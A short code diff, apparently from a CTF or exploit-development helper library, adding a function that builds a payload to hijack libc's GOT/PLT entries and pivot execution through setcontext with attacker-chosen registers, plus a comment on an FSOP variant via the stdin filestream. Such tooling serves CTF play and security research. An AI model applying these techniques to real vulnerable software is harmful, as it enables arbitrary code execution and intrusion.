@@ -71,6 +71,18 @@ def setcontext(regs, addr):
     0x1a8: fpstate,			# fpstate
     })
 
+
+def setcontext32(libc: ELF, **kwargs) -> (int, bytes):
+    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
+    plt_trampoline = libc.address + libc.get_section_by_name(".plt").header.sh_addr
+    return got, flat(
+        p64(0),
+        p64(got + 0x218),
+        p64(libc.symbols["setcontext"] + 32),
+        p64(plt_trampoline) * 0x40,
+        setcontext(kwargs, got+0x218),
+    )
+
 # setcontext32 but twice as small and works past 2.38
 # tldr is stdin filestream has a bunch of scratch space behind it
 # so we can write a ucontext_t there then fsop to setcontext
